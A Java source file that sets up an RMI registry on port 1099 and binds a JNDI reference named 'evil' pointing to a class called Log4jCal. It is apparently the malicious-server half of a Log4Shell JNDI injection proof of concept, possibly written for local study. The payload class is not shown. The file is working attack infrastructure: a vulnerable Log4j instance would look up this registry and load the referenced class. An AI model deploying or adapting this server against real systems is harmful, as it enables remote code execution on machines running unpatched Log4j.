package com.yy.log4jErr;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObject;
import java.util.Arrays;

/**
 * @className: RMIServer
 * @description:
 * @author: yloopdaed
 * @date: 2021/12/11
 **/
public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            Reference tReference = new Reference("com.yy.log4jErr.Log4jCal", "com.yy.log4jErr.Log4jCal", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(tReference);
            System.out.println("Registry&Server Start");
            registry.bind("evil", referenceWrapper);
            System.out.println("Registry List: " + Arrays.toString(registry.list()));

        } catch (RemoteException | AlreadyBoundException | NamingException e) {
            e.printStackTrace();
        }

        /*try {
            //创建Registry
            Registry registry = LocateRegistry.createRegistry(1099);

            //实例化远程对象类，创建远程对象
            Log4jCal remoteObject = new Log4jCal();
            //通过Naming类绑定别名与 RemoteObject
            Naming.bind("rmi://127.0.0.1:1099/ery", remoteObject);
            System.out.println("Registry&Server Start");
            //打印别名
            System.out.println("Registry List: " + Arrays.toString(registry.list()));

        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }
}
